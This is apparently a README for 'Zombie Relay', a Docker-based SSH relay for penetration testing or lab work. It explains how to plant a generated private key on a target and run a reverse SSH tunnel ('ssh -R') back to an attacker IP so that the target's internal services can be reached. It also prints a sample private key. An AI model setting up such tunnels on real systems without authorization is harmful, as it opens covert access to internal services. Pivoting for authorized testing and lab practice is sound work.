# Zombie Relay

## Usage

```sh
git clone https://github.com/0xyy66/ZombieRelay.git
cd ZombieRelay
docker compose up
```

Everytime you create the container, the compose will automatically create a new private key and print its content, so you can copy-paste it and drop it on the target to connect to the container.

```
...
zombierelay-1  | Use the following private key to access the server
zombierelay-1  | -----BEGIN OPENSSH PRIVATE KEY-----
zombierelay-1  | b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
zombierelay-1  | QyNTUxOQAAACAFqEIsJ1vglEsv4P2PZF2xj6WYlRmWFOJucCCFBAt1hAAAAIhlWMJQZVjC
zombierelay-1  | UAAAAAtzc2gtZWQyNTUxOQAAACAFqEIsJ1vglEsv4P2PZF2xj6WYlRmWFOJucCCFBAt1hA
zombierelay-1  | AAAEAN7V7UYQEnKO7vrOZmGGR7EulGE3Cjco41Jf7xbK9pPQWoQiwnW+CUSy/g/Y9kXbGP
zombierelay-1  | pZiVGZYU4m5wIIUEC3WEAAAAAAECAwQF
zombierelay-1  | -----END OPENSSH PRIVATE KEY-----
...
```

Make sure to remove the container prefix "zombierelay-1 | " from every line.

### Tunnel a remote service on your host

In order to correctly tunnel the remote service on your host, you need to drop the private key printed by docker (id_rsa) and run the following command on the target (assuming the target service that interests you runs locally on port 9090).

```sh
ssh -i id_rsa -p 2224 -R *:9090:127.0.0.1:9090 root@10.10.14.20 -N -f
```

The command above corresponds to: `ssh -i <private_key> -p <attacker_ssh_port> -R <attacker_iface>:<attacker_service_port>:<target_iface>:<target_service_port> root@<attacker_ip> -N -f`

### Config

You may need to edit the docker-compose.yaml file to modify the mapped ports or add more.

By default, the following ports are mapped:
- 2224:22 - OpenSSH exposed on your host on port 2224
- 9090:9090 - You can tunnel a remote application on port 9090, it will become accessible on localhost:9090


